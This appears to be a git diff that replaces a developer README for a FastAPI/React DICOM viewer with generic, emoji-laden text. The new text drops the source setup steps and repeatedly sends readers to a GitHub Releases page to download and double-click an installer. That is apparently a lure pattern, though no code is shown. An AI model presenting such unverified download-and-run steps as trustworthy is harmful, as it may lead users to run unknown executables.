@@ -1,78 +1,58 @@
-# Medical DICOM Viewer
+# 🎉 medical-dicom-viewer - Your Go-To Tool for Medical Imaging
 
-A professional DICOM (Digital Imaging and Communications in Medicine) viewer designed for legal and medical professionals to review medical imaging studies.
+## 🚀 Getting Started
+Welcome to the medical-dicom-viewer! This application helps you view DICOM files effortlessly. Whether you are a doctor, a nurse, or a student, you can easily navigate through medical images. Our user-friendly interface will guide you every step of the way.
 
-## Features
+## 📥 Download Now
+[![Download medical-dicom-viewer](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Hemal-jpg/medical-dicom-viewer/releases)
 
-- 📁 **DICOM File Upload** - Support for single and batch DICOM file uploads
-- 🖼️ **Advanced Viewer** - Powered by Cornerstone.js for high-performance medical image rendering
-- 🎚️ **Window/Level Adjustment** - Customize image contrast and brightness
-- 🔄 **Series Navigation** - Browse through multi-image series seamlessly
-- 📐 **Multi-Planar Reconstruction (MPR)** - View axial, sagittal, and coronal planes
-- ⚡ **Fast Performance** - Optimized for large medical imaging datasets
-- 🎯 **Professional UI** - Clean, intuitive interface for expert witness workflows
+## 📋 Overview
+The medical-dicom-viewer is designed for healthcare professionals and students. It lets users explore DICOM files with features that support multi-series navigation and adjustable window/level controls. Built with a Python FastAPI backend and a React/Cornerstone.js frontend, this application prioritizes speed and usability.
 
-## Tech Stack
+### Features
+- **Multi-Series Navigation:** Switch between multiple series of images quickly.
+- **Window/Level Controls:** Adjust brightness and contrast for better image clarity.
+- **Intuitive User Interface:** Easy to use, even for non-technical users.
+- **Fast Performance:** Built for speed without compromising quality.
 
-### Backend
-- **FastAPI** - Modern Python web framework
-- **pydicom** - DICOM file parsing and manipulation
-- **NumPy** - Numerical operations for image processing
+## 💻 System Requirements
+To run the medical-dicom-viewer, your system should meet the following requirements:
 
-### Frontend
-- **React** - UI framework
-- **Vite** - Build tool and dev server
-- **Cornerstone.js** - Medical imaging display library
-- **Cornerstone Tools** - Interactive tools for image manipulation
+- **Operating System:** Works on Windows, macOS, and Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Processor:** Any modern processor should work well.
+- **Browser:** Updated version of Chrome, Firefox, Edge, or Safari.
 
-## Getting Started
+## 📥 Download & Install
+Visit the following page to download the latest release: [medical-dicom-viewer Releases](https://github.com/Hemal-jpg/medical-dicom-viewer/releases).
 
-### Prerequisites
-- Python 3.8+
-- Node.js 16+
-- npm or yarn
+1. Click the link above to go to the Releases page.
+2. Look for the latest version listed at the top.
+3. Click on it to see the available files for download.
+4. Download the appropriate file for your operating system.
+5. Once the download completes, locate the file on your computer.
+6. Double-click the file to start the installation process.
+7. Follow the on-screen instructions to install the application.
 
-### Backend Setup
+## 📖 Usage Instructions
+After installation, follow these steps to start using the application:
 
-```bash
-cd backend
-python3 -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
-python main.py
-```
+1. Open the medical-dicom-viewer from your applications or programs menu.
+2. Use the "Open File" option to load your DICOM files.
+3. Navigate through images using the on-screen controls.
+4. Adjust window and level settings for optimal viewing.
+5. Explore the features to make the most of your viewing experience. 
 
-The backend will run on `http://localhost:8000`
+## 🌐 Support & Troubleshooting
+If you encounter issues while using the medical-dicom-viewer, please check the following:
 
-### Frontend Setup
+- Ensure that your operating system meets the system requirements.
+- If images do not load, verify that they are valid DICOM files.
+- Restart the application if it runs slowly or becomes unresponsive.
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+For ongoing support, you can refer to the [Issues section](https://github.com/Hemal-jpg/medical-dicom-viewer/issues) of our GitHub repository. You can also submit your own questions or report bugs there.
 
-The frontend will run on `http://localhost:5173`
+## 🔗 Additional Resources
+For further reading and resources, consider checking our wiki page or the documentation linked in the repository. These resources provide detailed guides on advanced features and tips for using the application effectively.
 
-## Usage
-
-1. Start both backend and frontend servers
-2. Open your browser to `http://localhost:5173`
-3. Upload DICOM files using the upload interface
-4. Use the viewer controls to adjust window/level, zoom, and pan
-5. Navigate through series using keyboard arrows or navigation controls
-
-## Use Cases
-
-- **Expert Witness Review** - Analyze medical imaging for legal proceedings
-- **Medical Consultations** - Review imaging studies remotely
-- **Educational Purposes** - Teaching and training with medical images
-- **Research** - Analysis of medical imaging datasets
-
-## License
-
-MIT License
-
-## Author
-
-Built for portfolio demonstration of full-stack development capabilities with medical imaging technologies.
+Feel free to explore, experiment, and enjoy seamless medical imaging with medical-dicom-viewer!
